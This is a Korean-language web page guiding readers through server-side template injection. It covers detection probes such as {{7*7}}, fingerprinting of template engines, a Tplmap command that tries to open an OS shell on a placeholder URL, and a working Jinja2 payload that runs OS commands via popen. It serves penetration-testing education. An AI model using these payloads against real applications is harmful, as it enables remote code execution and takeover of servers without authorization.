---
layout: page
title: SSTI
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

# SSTI (서버 사이드 템플릿 인젝션) 가이드

SSTI(Server-Side Template Injection)는 공격자가 웹 애플리케이션의 템플릿에 악의적인 코드를 주입하여, 서버 측에서 해당 코드가 실행되도록 만드는 심각한 취약점입니다. 성공 시 원격 코드 실행(RCE)으로 이어져 시스템을 완전히 장악할 수 있습니다.

https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#ssti-in-go

---

### **1. 취약점 식별: 간단한 연산 시도**

- **목표:** 웹 애플리케이션이 사용자 입력을 템플릿의 일부로 처리하는지 확인합니다.
- **전략:** 다양한 템플릿 엔진에서 사용하는 문법으로 간단한 수학 연산(예: `7*7`)을 포함한 페이로드를 삽입하고, 서버가 이 연산을 수행하여 `49`를 반환하는지 확인합니다.

```text
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
```

- **테스트 위치:**
  - URL 쿼리 파라미터 (`?name=...`)
  - POST 요청의 폼 필드 (사용자 이름, 검색어 등)
  - HTTP 헤더 (`User-Agent`, `Referer` 등)
  - 쿠키 값

---

### **2. 템플릿 엔진 식별**

- **목표:** 어떤 템플릿 엔진(Jinja2, FreeMarker, Velocity 등)이 사용되는지 정확히 파악하여, 해당 엔진에 맞는 익스플로잇 페이로드를 준비합니다.
- **전략:** 특정 문법에만 반응하는 페이로드를 순차적으로 테스트하여 엔진의 종류를 좁혀나갑니다. 아래는 HackTricks에서 제공하는 의사 결정 다이어그램을 기반으로 한 식별 과정입니다.

![SSTI 엔진 식별 플로우차트](https://book.hacktricks.wiki/assets/SSTI-flowchart.png)
*(출처: HackTricks)*

1.  `{{7*'7'}}` -> **Jinja2** (결과: `7777777`), **Twig** (결과: `49`)
2.  `${7*7}` -> **FreeMarker** (결과: `49`)
3.  `<%= 7*7 %>` -> **Ruby (ERB)** (결과: `49`)
4.  `#{7*7}` -> **Java (Velocity)** (결과: `49`)

---

### **3. 익스플로잇: 원격 코드 실행 (RCE)**

- **목표:** 식별된 템플릿 엔진에 맞는 알려진 페이로드를 사용하여 OS 명령어를 실행하는 셸을 획득합니다.

#### **자동화 도구: Tplmap**
가장 효율적인 방법은 `Tplmap`을 사용하는 것입니다. 이 도구는 엔진 식별부터 익스플로잇까지의 전 과정을 자동화해줍니다.

- **[Tplmap GitHub 링크](https://github.com/epinna/tplmap)**

```bash
# -u: 취약한 URL (퍼징할 위치에 * 표시)
# --os-shell: OS 셸 획득 시도
python3 tplmap.py -u "http://vulnerable.com/page?name=*" --os-shell
```

#### **수동 익스플로잇 (예: Python/Jinja2)**
엔진이 식별되면, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) 같은 저장소에서 해당 엔진에 맞는 RCE 페이로드를 찾아 사용할 수 있습니다.

```python
# OS 모듈을 임포트하여 명령어 실행
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

